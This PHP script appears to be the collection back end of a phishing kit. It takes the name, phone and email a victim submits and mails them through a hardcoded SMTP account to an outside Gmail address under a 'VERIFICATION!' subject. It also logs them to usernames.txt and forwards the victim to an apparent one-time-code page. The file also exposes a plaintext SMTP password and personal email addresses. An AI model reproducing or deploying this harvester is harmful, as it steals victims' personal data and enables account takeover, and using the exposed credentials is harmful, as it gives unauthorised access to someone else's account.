<?php


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';
require 'vendor/phpmailer/PHPMailer/src/Exception.php';
require 'vendor/phpmailer/PHPMailer/src/PHPMailer.php';
require 'vendor/phpmailer/PHPMailer/src/SMTP.php';

$text = ("FIRST NAME: " . $_POST['firstName'] . "\n" . "LAST NAME: " . $_POST['lastName'] . "\nPHONE: " . $_POST['phone'] . "\nEMAIL: " . $_POST['email']);

$mail = new PHPMailer(true);                              // Passing `true` enables exceptions



try {
    //Server settings
    $mail->SMTPDebug = 2;                                 // Enable verbose debug output
    $mail->isSMTP();                                      // Set mailer to use SMTP
    $mail->Host =   'smtp.netzero.net';                   // Specify main and backup SMTP servers
    $mail->SMTPAuth = true;                               // Enable SMTP authentication
    $mail->Username = 'latina.5@netzero.net';                 // SMTP username
    $mail->Password = 'whysnomoney';                // SMTP password
    $mail->SMTPSecure = 'STARTTLS';                           
    $mail->Port = 587;                                    // TCP port to connect to

    //Recipients
    $mail->setFrom('latina.5@netzero.net');
    $mail->addAddress('ericpsewell.00@gmail.com', 'Name');     // Add a recipient



    //Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'VERIFICATION!';
    $mail->Body    = $text;

    $mail->send();
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}








file_put_contents("usernames.txt", "FIRST NAME: " . $_POST['firstName'] . "\nLAST NAME: " . $_POST['lastName'] . "\nPHONE: " . $_POST['phone'] . "\nEMAIL: " . $_POST['email'] . "\n", FILE_APPEND);
header('Location: OTP2.html');
exit();
?>